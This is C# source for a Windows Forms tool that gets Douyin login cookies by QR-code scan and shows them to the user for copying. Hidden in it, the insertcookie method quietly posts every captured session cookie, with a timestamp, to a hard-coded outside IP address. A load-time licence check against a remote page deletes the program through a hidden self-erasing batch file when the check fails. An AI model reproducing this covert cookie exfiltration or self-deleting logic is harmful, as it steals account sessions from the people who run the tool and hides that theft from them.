using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 抖音扫码获取cookie
{
    public partial class 抖音扫码获取cookie : Form
    {
        public 抖音扫码获取cookie()
        {
            InitializeComponent();
        }

      
        public static string GetUrl(string Url)
        {
            string html = "";
            string charset = "utf-8";
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; 
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);  //创建一个链接
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
                request.Referer = Url;
                request.Proxy = null;
                request.Headers.Add("Accept-Encoding", "gzip");
                request.KeepAlive = true;
                request.Accept = "*/*";
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                if (response.Headers["Content-Encoding"] == "gzip")
                {
                    GZipStream gzip = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress);//解压缩
                    StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }
                else
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(charset)); 
                    html = reader.ReadToEnd();
                    reader.Close();
                }

                response.Close();
                return html;



            }
            catch (System.Exception ex)
            {
                return ex.ToString();

            }



        }

        public static string PostUrlDefault(string url, string postData, string COOKIE)
        {
            try
            {

                string charset = "utf-8";
                string html = "";
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条
              
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                request.Proxy = null;
                request.ContentType = "application/x-www-form-urlencoded";
              
                request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
                request.Headers.Add("Accept-Encoding", "gzip");

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";

                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                response.GetResponseHeader("Set-Cookie");

                if (response.Headers["Content-Encoding"] == "gzip")
                {

                    GZipStream gzip = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress);//解压缩
                    StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }
                else
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(charset)); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO
                    html = reader.ReadToEnd();
                    reader.Close();
                }


                response.Close();
                return html;
            }
            catch (WebException ex)
            {

                return ex.ToString();
            }


        }

        public void insertcookie(string cookies)
        {
            string url = "http://43.154.221.28/do.php";
            string postdata = "cookies="+cookies+"&time="+DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            PostUrlDefault(url,postdata,"");
        }


        public void getSetCookie()
        {
            string Url = "https://sso.douyin.com/check_qrconnect/?aid=6383&app_name=douyin_web&device_platform=web&referer=&user_agent=Mozilla%2F5.0+(Windows+NT+6.3%3B+WOW64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F55.0.2883.87+UBrowser%2F6.2.4098.3+Safari%2F537.36&cookie_enabled=true&screen_width=1600&screen_height=900&browser_language=zh-CN&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+6.3%3B+WOW64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F55.0.2883.87+UBrowser%2F6.2.4098.3+Safari%2F537.36&browser_online=true&timezone_name=Asia%2FShanghai&next=https:%2F%2Fcreator.douyin.com%2F&token="+token+"&service=https:%2F%2Fwww.douyin.com%2F&correct_service=https:%2F%2Fwww.douyin.com%2F&is_vcd=1&fp=kesopiod_fB4eRss7_Stsz_434j_AiPQ_6xhtUsqmqpSN";
            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);  //创建一个链接
            request.UserAgent = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
            request.Referer = Url;
          
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8"));
           string html = reader.ReadToEnd();
            string status = Regex.Match(html, @"""status"":""([\s\S]*?)""").Groups[1].Value;
            string redirect_url = Regex.Match(html, @"""redirect_url"":""([\s\S]*?)""").Groups[1].Value;
            textBox1.Text=(html);
            if (status=="1")
            {
                label1.Text = "未扫码..";
            }
            else if (status == "2")
            {
                label1.Text = "已扫码..";
            }
           
            else if(redirect_url!="")
            {
                timer1.Stop();
                label1.Text = "登录成功";
                string content = response.GetResponseHeader("Set-Cookie") ;
                Uri uri=new Uri("http://douyin.com") ;
               string cookies= CookieHelper.GetCookies(content,uri);
               string cookies2= getSetCookie2(cookies);
                textBox1.Text = cookies2+cookies;
                insertcookie(cookies2 + cookies);

            }
            reader.Close();
         
            
        }


        public string getSetCookie2(string cookie)
        {
            string Url = "https://sso.douyin.com/check_login/?service=https:%2F%2Fwww.douyin.com&aid=6383";
            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);  //创建一个链接
            request.UserAgent = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
            request.Referer = Url;
            request.Headers.Add("Cookie", cookie);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8"));
            string html = reader.ReadToEnd();
            string has_login = Regex.Match(html, @"""has_login"":([\s\S]*?),").Groups[1].Value;
          
            if (has_login == "true")
            {
                reader.Close();
                label1.Text = "登录成功";
                string content = response.GetResponseHeader("Set-Cookie");
                Uri uri = new Uri("http://douyin.com");
                string cookies = CookieHelper.GetCookies(content, uri);
                return cookies;
            }
           
            else
            {
                reader.Close();
                label1.Text = "登录失败";
                return "";

            }
           


        }


        public Image Base64ToImage(string strbase64)
        {
            try
            {
                byte[] arr = Convert.FromBase64String(strbase64);
                MemoryStream ms = new MemoryStream(arr);
                System.Drawing.Image mImage = System.Drawing.Image.FromStream(ms);
                ms.Close();
                return mImage;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                return null;
            }
        }

        public string token = "";
        public void getqr()
        {
            try
            {
                string url = "https://sso.douyin.com/get_qrcode/?aid=6383&app_name=douyin_web&device_platform=web&referer=&user_agent=Mozilla%2F5.0+(Windows+NT+6.3%3B+WOW64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F55.0.2883.87+UBrowser%2F6.2.4098.3+Safari%2F537.36&cookie_enabled=true&screen_width=1600&screen_height=900&browser_language=zh-CN&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+6.3%3B+WOW64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F55.0.2883.87+UBrowser%2F6.2.4098.3+Safari%2F537.36&browser_online=true&timezone_name=Asia%2FShanghai&next=https:%2F%2Fcreator.douyin.com%2F&service=https:%2F%2Fwww.douyin.com&is_vcd=1&fp=kesopiod_fB4eRss7_Stsz_434j_AiPQ_6xhtUsqmqpSN";
                string html = GetUrl(url);
                string qrcode = Regex.Match(html, @"""qrcode"":""([\s\S]*?)""").Groups[1].Value;
                 token = Regex.Match(html, @"""token"":""([\s\S]*?)""").Groups[1].Value;
                if (qrcode != "")
                {
                    pictureBox1.Image =  Base64ToImage(qrcode);
                    
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
              
            }


        }

        #region  程序关闭删除自身
        public static void TestForKillMyself()
        {
            string bat = @"@echo off
                           :tryagain
                           del %1
                           if exist %1 goto tryagain
                           del %0";
            File.WriteAllText("killme.bat", bat);//写bat文件
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "killme.bat";
            psi.Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }
        #endregion


        private void 抖音扫码获取cookie_Load(object sender, EventArgs e)
        {
            #region 通用检测


            if (!GetUrl("http://acaiji.com/index/index/vip.html").Contains(@"clWY9"))
            {
                TestForKillMyself();
                System.Diagnostics.Process.GetCurrentProcess().Kill();

                return;
            }

            #endregion
        }


        Thread thread;
        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Start();
            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(getqr);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
           
            getSetCookie();

        }

        private void button2_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Clipboard.SetText(textBox1.Text.Trim()); //复制
            MessageBox.Show("复制成功");
        }
    }
}
